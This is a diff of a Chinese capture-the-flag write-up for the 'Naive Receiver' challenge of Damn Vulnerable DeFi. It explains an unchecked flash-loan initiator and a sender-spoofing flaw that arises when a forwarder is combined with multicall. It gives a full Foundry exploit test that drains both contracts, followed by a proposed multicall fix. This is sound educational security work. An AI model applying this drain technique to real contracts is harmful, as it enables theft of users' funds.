@@ -25,89 +25,89 @@ Multicall 是一个智能合约库，其作用是允许批量执行多个函数�
 **任务1：清空`FlashLoanReceiver`合约的资产。**  
 在 `FlashLoanReceiver` 合约的 `onFlashLoan` 函数中，并没有对发起闪电贷的地址做检查，所以任何地址都可以发起以该合约为名义的闪电贷，那么通过将接收者合约作为目标发起闪电贷，由于手续费为 1 WETH，那么调用 10 次，即可以耗尽。并且可以使用 Multi call 在一笔交易中完成。
 ``` solidity
-    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
-        external
-        returns (bytes32)
-    {
-        assembly {
-            // gas savings
-            if iszero(eq(sload(pool.slot), caller())) {
-                mstore(0x00, 0x48f5c3ed)
-                revert(0x1c, 0x04)
-            }
+function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
+    external
+    returns (bytes32)
+{
+    assembly {
+        // gas savings
+        if iszero(eq(sload(pool.slot), caller())) {
+            mstore(0x00, 0x48f5c3ed)
+            revert(0x1c, 0x04)
         }
-
-        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();
-
-        uint256 amountToBeRepaid;
-        unchecked {
-            amountToBeRepaid = amount + fee;
-        }
-
-        _executeActionDuringFlashLoan();
-
-        // Return funds to pool
-        WETH(payable(token)).approve(pool, amountToBeRepaid);
-
-        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
+
+    if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();
+
+    uint256 amountToBeRepaid;
+    unchecked {
+        amountToBeRepaid = amount + fee;
+    }
+
+    _executeActionDuringFlashLoan();
+
+    // Return funds to pool
+    WETH(payable(token)).approve(pool, amountToBeRepaid);
+
+    return keccak256("ERC3156FlashBorrower.onFlashLoan");
+}
 ```
 
 **任务2：清空 `NaiveReceiverPool` 合约资产。**  
-在`NaiveReceiverPool`合约中取资产的方式有 `withdraw`，并且存款和取款使用了一个自定义的 `_msgSender()` 函数，在这个函数中是取中继器发来的 `msg.data` 的最后 20 个字节作为 `msgSender` 。那么可以在 `msg.data` 最后增加一个地址，并且这个地址需要在 `deposits` 变量中有资产，不然扣除不了 `amount` 。
+在`NaiveReceiverPool`合约中取资产的方式有 `withdraw`，并且存款和取款使用了一个自定义的 `_msgSender()` 函数，在这个函数中是取中继器发来的 `msg.data` 的最后 20 个字节作为 `msgSender` 。正常来说，通过中继器调用`NaiveReceiverPool`合约时，会将真正的发送者的地址拼接到最后 20 字节，正常调用没什么问题。但是关键点在于，这个合约集成了 Forwarder 和 Multi call 功能，那么通过中继器调用 Multi call 时，虽然在最后拼接了真正的发送者地址，但是如果通过 Multi call 在调用不同的子调用，调用到 `withdraw` 函数时，调用者自己拼接上某个地址，此时 `_msgSender()` 函数会返回这个地址。中继器拼接上的地址将不会算在这次的子调用的 `calldata` 中。好的，此外那我们拼接的这个地址需要在 `deposits` 变量中有资产。
 ``` solidity
-    function withdraw(uint256 amount, address payable receiver) external {
-        // Reduce deposits
-        deposits[_msgSender()] -= amount;
-        totalDeposits -= amount;
+function withdraw(uint256 amount, address payable receiver) external {
+    // Reduce deposits
+    deposits[_msgSender()] -= amount;
+    totalDeposits -= amount;
 
-        // Transfer ETH to designated receiver
-        weth.transfer(receiver, amount);
+    // Transfer ETH to designated receiver
+    weth.transfer(receiver, amount);
+}
+
+function deposit() external payable {
+    _deposit(msg.value);
+}
+
+function _deposit(uint256 amount) private {
+    weth.deposit{value: amount}();
+
+    deposits[_msgSender()] += amount;
+    totalDeposits += amount;
+}
+
+function _msgSender() internal view override returns (address) {
+    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
+        return address(bytes20(msg.data[msg.data.length - 20:]));
+    } else {
+        return super._msgSender();
     }
-
-    function deposit() external payable {
-        _deposit(msg.value);
-    }
-
-    function _deposit(uint256 amount) private {
-        weth.deposit{value: amount}();
-
-        deposits[_msgSender()] += amount;
-        totalDeposits += amount;
-    }
-
-    function _msgSender() internal view override returns (address) {
-        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
-            return address(bytes20(msg.data[msg.data.length - 20:]));
-        } else {
-            return super._msgSender();
-        }
-    }
+}
 ```
 之后仔细看 `flashLoan` 函数，发现手续费接收地址 `feeReceiver` 是会增加 `deposits` 的。并且根据测试文件和构造函数，可以看出 `deployer` 和 `feeReceiver` 是同一个地址。  
 ``` solidity
-    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
-        external
-        returns (bool)
-    {
-        if (token != address(weth)) revert UnsupportedCurrency();
+function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
+    external
+    returns (bool)
+{
+    if (token != address(weth)) revert UnsupportedCurrency();
 
-        // Transfer WETH and handle control to receiver
-        weth.transfer(address(receiver), amount);
-        totalDeposits -= amount;
+    // Transfer WETH and handle control to receiver
+    weth.transfer(address(receiver), amount);
+    totalDeposits -= amount;
 
-        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
-            revert CallbackFailed();
-        }
-
-        uint256 amountWithFee = amount + FIXED_FEE;
-        weth.transferFrom(address(receiver), address(this), amountWithFee);
-        totalDeposits += amountWithFee;
-
-        deposits[feeReceiver] += FIXED_FEE;
-
-        return true;
+    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
+        revert CallbackFailed();
     }
+
+    uint256 amountWithFee = amount + FIXED_FEE;
+    weth.transferFrom(address(receiver), address(this), amountWithFee);
+    totalDeposits += amountWithFee;
+
+    deposits[feeReceiver] += FIXED_FEE;
+
+    return true;
+}
 ```
 
 ## 题解
@@ -118,36 +118,36 @@ Multicall 是一个智能合约库，其作用是允许批量执行多个函数�
 
 调用 `forwarder` 之前还需要拼好签名。测试代码如下：  
 ``` solidity
-    function test_naiveReceiver() public checkSolvedByPlayer {
-        bytes[] memory callDatas = new bytes[](11);
-        for(uint i = 0; i < 10; i++){
-            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
-        }
-        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
-            bytes32(uint256(uint160(pool.feeReceiver())))
-        );
-        bytes memory callData;
-        callData = abi.encodeCall(pool.multicall, callDatas);
-        BasicForwarder.Request memory request = BasicForwarder.Request(
-            player,
-            address(pool),
-            0,
-            30000000,
-            forwarder.nonces(player),
-            callData,
-            block.timestamp
-        );
-        bytes32 requestHash = keccak256(
-            abi.encodePacked(
-                "\x19\x01",
-                forwarder.domainSeparator(),
-                forwarder.getDataHash(request)
-            )
-        );
-        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
-        bytes memory signature = abi.encodePacked(r, s, v);
-        require(forwarder.execute(request, signature));
+function test_naiveReceiver() public checkSolvedByPlayer {
+    bytes[] memory callDatas = new bytes[](11);
+    for(uint i = 0; i < 10; i++){
+        callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
     }
+    callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+        bytes32(uint256(uint160(pool.feeReceiver())))
+    );
+    bytes memory callData;
+    callData = abi.encodeCall(pool.multicall, callDatas);
+    BasicForwarder.Request memory request = BasicForwarder.Request(
+        player,
+        address(pool),
+        0,
+        30000000,
+        forwarder.nonces(player),
+        callData,
+        block.timestamp
+    );
+    bytes32 requestHash = keccak256(
+        abi.encodePacked(
+            "\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(request)
+        )
+    );
+    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+    bytes memory signature = abi.encodePacked(r, s, v);
+    require(forwarder.execute(request, signature));
+}
 ```
 **运行测试：**  
 ```
@@ -162,3 +162,26 @@ Ran 2 tests for test/naive-receiver/NaiveReceiver.t.sol:NaiveReceiverChallenge
 Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 15.46ms (7.34ms CPU time)
 ```
 
+## 漏洞修复
+可以修改 `multicall` 函数，如果是 forwarder 合约发来的调用，那么在每个子调用中都拼接上真正发送者地址。
+```solidity
+function multicall(
+    bytes[] calldata data
+) external override returns (bytes[] memory results) {
+    results = new bytes[](data.length);
+    bytes memory __msgSender;
+    if (msg.sender == trustedForwarder) {
+        __msgSender = msg.data[msg.data.length - 20:];
+    }
+    for (uint256 i = 0; i < data.length;) {
+        results[i] = Address.functionDelegateCall(
+            address(this),
+            abi.encodePacked(data[i], __msgSender)
+        );
+        unchecked {
+          ++i;
+        }
+    }
+    return results;
+}
+```
